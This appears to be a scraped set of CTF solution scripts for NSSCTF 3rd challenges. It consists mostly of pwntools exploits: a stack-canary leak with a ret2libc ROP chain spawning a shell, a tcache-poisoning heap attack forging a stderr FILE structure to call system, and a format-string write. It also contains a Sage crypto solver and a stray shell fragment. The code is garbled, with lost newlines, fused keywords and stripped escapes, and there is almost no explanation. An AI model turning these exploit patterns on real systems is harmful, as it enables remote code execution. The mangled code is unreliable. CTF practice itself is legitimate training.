# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/NSSCTF3rd部分writeup.md
# TITLE: NSSCTF3rd部分writeup
# CATEGORY: pwn

from pwn import* from LibcSearcher import* from struct import pack from ctypes import* # io = remote("127.0.0.1", 55299) # io = remote("192.168.170.128", 1234) # io = remote("182.92.237.102", 10015) io = remote("node8.anna.nssctf.cn", 22528) # io = process("./ezstack") # io = remote("3.1.2.3", 8888) # context(os="linux", arch="amd64") context(os="linux", arch="amd64", log_level="debug") elf = ELF('./ezstack') # libc = ELF('./libc-2.23.so') # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc = ELF('/home/yukon/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6') # ctfshow用的ubuntu18.04 lg_infos = [] lga =lambda data: lg_infos.append(data) s =lambda data: io.send(data) sl =lambda data: io.sendline(data) sa =lambda text, data: io.sendafter(text, data) sla =lambda text, data: io.sendlineafter(text, data) r =lambda n: io.recv(n) ru =lambda text: io.recvuntil(text) rl =lambda: io.recvline() uu32 =lambda: u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00')) uu64 =lambda: u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00")) iuu32 =lambda: int(io.recv(10), 16) iuu64 =lambda: int(io.recv(6), 16) uheap =lambda: u64(io.recv(6).ljust(8, b'x00')) # lg = lambda addr: log.success(addr) # lg = lambda addr: log.info(addr) lg =lambda data : io.success('%s -> 0x%x'% (data, eval(str(data)))) ia =lambda: io.interactive() def log_all(): for lg_info in lg_infos: lg(lg_info) def attach(io, gdbscript=""): log_all() gdb.attach(io, gdbscript) def get_sb(): return libc_base + libc.sym['system'], libc_base +next(libc.search(b'/bin/shx00')) # gdb.attach(io) # gdb.attach(io, 'b printf') # gdb.attach(io, 'b *0x4011B4') puts_addr =0x0401261 pop_rdi =0x0000000000401303 payload_f =b'--%13$p-' sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FD)) puts_real = uu64() lg("puts_real") sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts']) + p64(0x4011FD)) printf_real = uu64() lg("printf_real") libc_base = puts_real -0x84420 lib_binsh_addr = libc_base +0x1b45bd lib_system_addr = libc_base +0x52290 # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc_base = puts_real - libc.sym['puts'] # lib_system_addr, lib_binsh_addr = get_sb() # libc = LibcSearcher('puts', puts_real) # lib_system_addr = libc.dump('system') # lib_binsh_addr = libc.dump("str_bin_sh") sla(b"canary challenge", payload_f) ru(b'--') canary =int(ru(b'-')[:-1], 16) lg("canary") ru(b'>') sl(b'a'*0x28+ p64(canary) + p64(0) + p64(0x000000000040101a) + p64(pop_rdi) + p64(lib_binsh_addr) + p64(lib_system_addr)) ia() # io.recvuntil("(.*?)") # io.recvuntil(b"$1") # io.sendline(str((.*?))) # io.sendline(str($1).encode())
from pwn import*import sys
# Define lambda functions for common operationss =lambda data :io.send(data)sa =lambda delim,data :io.sendafter(delim, data)sl =lambda data :io.sendline(data)sla =lambda delim,data :io.sendlineafter(delim, data)r =lambda num :io.recv(num)ru =lambda delims, drop=True :io.recvuntil(delims, drop)rl =lambda :io.recvline()uu32 =lambda data :
u32(data.ljust(4,b'x00'))uu64 =lambda data :
u64(data.ljust(8,b'x00'))ls =lambda data :
log.success(data)lss =lambda s :ls('33[1;31;40m%s --> 0x%x33[0m'% (s, eval(s)))itr =lambda :io.interactive()
# Context settingscontext.arch ='amd64'context.log_level ='debug'# infocontext.terminal = ['tmux','splitw','-h','-l','170']def start(binary,argv=[], *a, **kw):'''Start the exploit against the target.'''if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)elif args.CMD: return process(binary.split(' '))elif args.REM: return remote()elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))''' Usage: python3 exp.py AWD   '''return process([binary] + argv, *a, **kw)
binary ='./pwn'libelf =''
elf = ELF(binary);rop = ROP(binary)libc = ELF('libc.so.6')gdbscript ='''#continue'''.format(**locals())

    #import socks#context.proxy = (socks.SOCKS5, '192.168.80.102', 10808)
io = start(binary)

def add(idx,size,text='A'): ru(': ') sl('1') ru(': ') sl(str(idx)) ru(': ') sl(str(size)) ru('t') s(text)
def rm(idx): ru(': ') sl('2') ru(': ') sl(str(idx))
def show(idx): ru(': ') sl('3') ru(': ') sl(str(idx))
ru('n')sl('TLNTQpRgMrjK')
for i inrange(10): add(i,0x100,"A")

for i inrange(7): rm(i)rm(8)show(8)libc_base = uu64(r(6)) -2206944libc.address = libc_baseshow(0)key = uu64(r(5))

rm(7)add(10, 0x100,'hack1')rm(8)add(11, 0xf0, b'hacker2')
add(12, 0xf0, p64(0)*2+ p64(key ^ (libc.sym['_IO_2_1_stderr_'])))

add(13, 0x100)
_stderr = libc.sym['_IO_2_1_stderr_']fake_IO_addr = _stderr
pay = flat({0x00: ' sh;',0x18-0x10: libc.sym['setcontext'] +61,0x20-0x10: fake_IO_addr, # 0x20 > 0x180x18: libc.sym['system'],0xa0: fake_IO_addr-0x10, # 取此地址 +0xe0的地址，但是 在这里是 stdout 的 flags,为了不影响stdout修改0xc0: 1, # mode0xe0-0x10: fake_IO_addr, # 0xe0 0xd8: libc.sym['_IO_wfile_jumps'] +0x30, },filler=b'x00')

    #gdb.attach(io,gdbscript)
add(14, 0x100,pay)
lss('libc_base')lss('key')

sl('1')sl('88')sl('88')
itr()
from pwn import* import sys # Define lambda functions for common operations s =lambda data :io.send(data) sa =lambda delim,data :io.sendafter(delim, data) sl =lambda data :io.sendline(data) sla =lambda delim,data :io.sendlineafter(delim, data) r =lambda num :io.recv(num) ru =lambda delims, drop=True :io.recvuntil(delims, drop) rl =lambda :io.recvline() uu32 =lambda data :
u32(data.ljust(4,b'x00')) uu64 =lambda data :
u64(data.ljust(8,b'x00')) ls =lambda data :
log.success(data) lss =lambda s :ls('33[1;31;40m%s --> 0x%x 33[0m'% (s, eval(s))) itr =lambda :io.interactive() # Context settings context.arch ='amd64' context.log_level ='debug'# info context.terminal = ['tmux','splitw','-h','-l','170'] def start(binary,argv=[], *a, **kw): '''Start the exploit against the target.''' if args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw) elif args.CMD: return process(binary.split(' ')) elif args.REM: return remote('node8.anna.nssctf.cn',23254) elif args.AWD: return remote(sys.argv[1], int(sys.argv[2])) ''' Usage: python3 exp.py AWD   ''' return process([binary] + argv, *a, **kw) binary ='./attachment' libelf ='' try: elf = ELF(binary);rop = ROP(binary) libc = ELF(libelf) if libelf else elf.libc ''' Load binary and libraries ''' 
except: exit(0) gdbscript =''' b *0x0401242 #continue '''.format(**locals()) io = start(binary) def sp(pay): ru('>') sl(pay) pay ='%9$p-%6$p-' sp(pay) libc_base =int(ru('-'),16) -147587 stack =int(ru('-'),16) -200 lss('libc_base') lss('stack') pay =f'%{stack &0xffff}c%11$hnx00' sp(pay) pay =f'%{0x4020+1}c%{6+0x21}$hnx00' sp(pay) system = libc_base +336528 t1 = (system >>8) &0xFFFF pay =f'%{t1}c%{6+7}$hnx00' sp(pay) itr()
from Crypto.Util.number import*
def babystep_giantstep(g, y, p, q=None):if q isNone: q = p -1 m =int(q**0.5+0.5) table = {} gr =1for r inrange(m): table[gr] = r gr = (gr * g) % p
try: gm =pow(g, -m, p)
except:
return None ygqm = yfor q inrange(m):if ygqm in table:
return q * m + table[ygqm] ygqm = (ygqm * gm) % preturn None
def pohlig_hellman_DLP(g, y, p): n=1 factors = [2,3,7,37,41,67,199,397,3463,21649,34849,333667,513239] crt_moduli = [] crt_remain = []for q in factors: x = babystep_giantstep(pow(g, (p -1) // q, p), pow(y, (p -1) // q, p), p, q)if (x isNone) or (x <=1): continue crt_moduli.append(q) crt_remain.append(x) n*=q x = crt(crt_remain, crt_moduli)return (x,n)
nss =129063444400395931140552937306125851382394430986439278160593873744789936793795518045323178995007062628298309773582176239691459885773526624534690277511861861603281624682554253545227928169748182762012056234854538541309647111293806528166653033498149834445725530659660926127593831428768095049111056550293489376446453196283413940748453177975852069148305909986767912740830549027892132105563377310203897753966350743874679104628321785862987706430998848051299468409157327409929019736966482807332241638171032488791288702638854996896008055380420273360334533680833179185524820732104480666659321861366843400175400593725077960919448688150587388484016394469887799115548829c1th =34434392180151160913417544852616971692121904677314473399957347521083237373034994312975350004829141725822217771937654823384811574065863494723195053499396034949290411943322317170325058243501037304118017625559902628138026099775011556912632571666551501574674149399754491989755975771939193289559108779735832803131353873359793188227274679870124905519577462789862633176435874379040514994389592895575023493569300837110208625710266981571291166908408795186263690648761483931536077993683195891166866749702144363195471519064199405194909234060054947618318112220998235092847932193233297870660035092387998034397222343161862784190790234800655328367322488558923652724216788c2nd =2607182269911588640317443768516313475146031043011942375047416295563239497652683572392929453795834334601092180070778075446956225213228673291202712614851722328808263442169879046516657696381344172034458368689995793563352685120784745264814592735479698208625232292101406540095075755385738751964408524935105574210332493169531158694712409957008980603987021669723807161080311585592233184680564859608827956836072947637991546257832547921898039818720396103470292159465748053549459040177976994334908062142249458811885621719209965027537964222416346303361195322236614316663222188005352271974634346800843280024794327865267659775840158740927725776164466534809032826708671p3rd =34625024969762267128651307772809623649843622265032692142413571471210174269061639087466847081494470128344958794692961988682025560523709683489711068300641190919761862123159064271694245866486251838863170363349568878104217
xx,n=pohlig_hellman_DLP(3,c2nd,p3rd)R.<x>= PolynomialRing(Zmod(nss//p3rd))for mp in GF(p3rd)(c1th).nth_root(3, all=True): mm=crt([int(mp),int(xx)],[p3rd,n]) f=(x*p3rd*n+mm)^3-c1th root=f.monic().small_roots(X =2^(1200-mm.bit_length()),beta=0.5,epsilon=0.02)if root:
print(long_to_bytes(int(root[0]*p3rd*n+mm)))
#!/usr/bin/env sh
set-euo pipefail
min=0max=999999999attempts=5
random_number=$(head -c512 /dev/urandom | tr -dc 0-9| head -c9)
